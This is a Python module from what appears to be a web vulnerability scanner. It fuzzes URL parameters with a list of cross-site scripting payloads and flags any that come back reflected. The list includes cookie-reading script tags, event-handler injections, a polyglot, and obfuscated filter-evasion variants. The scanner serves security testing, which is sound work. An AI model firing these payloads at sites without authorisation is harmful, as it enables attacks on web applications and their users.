
import os
import sys

# Add parent directory to sys.path
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

import utils
from core.network import requester
from config import Colors, PAYLOAD_THREADS

# Comprehensive XSS Payloads
COMPREHENSIVE_XSS_PAYLOADS = [
    # Standard Script Tags
    "<script>alert('XSS')</script>",
    "<script>alert(document.cookie)</script>",
    
    # Event Handlers (Img, Svg, Body)
    "<img src=x onerror=alert('XSS')>",
    "<svg/onload=alert('XSS')>",
    "<body onload=alert('XSS')>",
    "<iframe/onload=alert('XSS')>",
    
    # Context Breaking / Attribute Injection
    "'\"><script>alert('XSS')</script>",
    "\"><img src=x onerror=alert('XSS')>",
    "\" onmouseover=\"alert('XSS')", 
    "' onfocus='alert(1)' autofocus",
    
    # Javascript Pseudo-Protocol
    "javascript:alert('XSS')",
    "<a href='javascript:alert(1)'>ClickMe</a>",
    
    # Polyglots
    "javascript://%250Aalert(1)//",
    r"/*-/*`/*\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e",
    
    # Filter Evasion / Obfuscation
    "<scr<script>ipt>alert(1)</script>",
    "<script>eval(atob('YWxlcnQoMSk='))</script>",
    "<img src=x onerror=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>",
    
    # DOM Based
    "#<script>alert(1)</script>",
    "{{7*7}}",
    "${alert(1)}"
]

def scan(url):
    """Comprehensive XSS scanner with context detection."""
    if not utils.check_endpoint_alive(url):
        return []

    import random
    import threading
    from concurrent.futures import ThreadPoolExecutor, as_completed
    
    xss_payloads = COMPREHENSIVE_XSS_PAYLOADS.copy()
    try:
        base_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
        payload_dir = os.path.join(base_dir, "Payloads", "XSS_payload")
        extra_payloads = utils.load_payloads_from_dir(payload_dir, extensions=[".txt"])
        if extra_payloads:
            xss_payloads.extend(extra_payloads)  # Unlocked: scan all payloads
    except:
        pass
    
    xss_payloads = list(set(xss_payloads))
    
    vulnerabilities = []
    
    def test_target(target_data):
        test_url = target_data['url']
        payload = target_data['payload']
        param = target_data['param']
        
        try:
            response = requester.get(test_url, timeout=5)
            if response and payload in response.text:
                # Basic check: if payload is exactly reflected, it might be XSS.
                # In a real deep scanner, we'd check for escaping. 
                # For now, we assume if the complex payloads are returned as-is, it's vulnerable.
                
                info = utils.get_vuln_details("Cross-Site Scripting (XSS)")
                return {
                    "type": "Cross-Site Scripting (XSS)",
                    "payload": payload,
                    "evidence": f"Payload reflected in response",
                    "location": f"Parameter: {param} (URL: {test_url})",
                    "endpoint": url,
                    "parameter": param,
                    "confidence": "Medium", # Medium because we don't verify execution
                    "impact": info["impact"],
                    "severity": "Medium",
                    "recommendation": info["recommendation"]
                }
        except:
            pass
        return None
    
    # Generate tasks
    scan_tasks = []
    for payload in xss_payloads:
        fuzzed_targets = utils.generate_fuzzed_urls(url, payload)
        for target in fuzzed_targets:
            target['payload'] = payload
            scan_tasks.append(target)

    # Moderate thread count
    with ThreadPoolExecutor(max_workers=PAYLOAD_THREADS) as executor:
        futures = [executor.submit(test_target, t) for t in scan_tasks]
        for future in as_completed(futures):
            res = future.result()
            if res:
                vulnerabilities.append(res)

    return vulnerabilities

if __name__ == "__main__":
    import sys
    print("Standalone XSS Scanner")
    if len(sys.argv) < 2:
        target = input("Enter target URL: ").strip()
    else:
        target = sys.argv[1]
    
    if target:
        results = scan(target)
        print(f"\nFound {len(results)} vulnerabilities.")
        for v in results:
            print(f"[-] {v['type']}: {v['payload']}")
